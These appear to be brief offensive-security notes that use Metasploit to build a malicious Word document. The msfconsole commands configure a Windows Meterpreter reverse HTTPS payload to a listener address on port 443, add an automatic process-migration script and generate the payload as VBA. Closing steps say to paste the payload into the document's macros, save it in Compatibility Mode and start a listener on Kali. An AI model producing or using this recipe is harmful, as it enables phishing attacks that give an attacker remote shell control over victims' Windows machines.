```bash
# in msfconsole
msf6 exploit(multi/fileformat/office_word_macro) > use windows/meterpreter/reverse_https
msf6 payload(windows/meterpreter/reverse_https) > set LHOST 10.0.254.201
LHOST => 10.0.254.201
msf6 payload(windows/meterpreter/reverse_https) > set LPORT 443
LPORT => 443
msf6 payload(windows/meterpreter/reverse_https) > set AutoRunScript post/windows/manage/smart_migrate
AutoRunScript => post/windows/manage/smart_migrate
msf6 payload(windows/meterpreter/reverse_https) > generate -f vba
# PAYLOAD copy from stdout
```
Add to macros and save as doc (Compatibility Mode)
open listener on kali
payload windows/meterpreter/reverse_https
LHOST 443
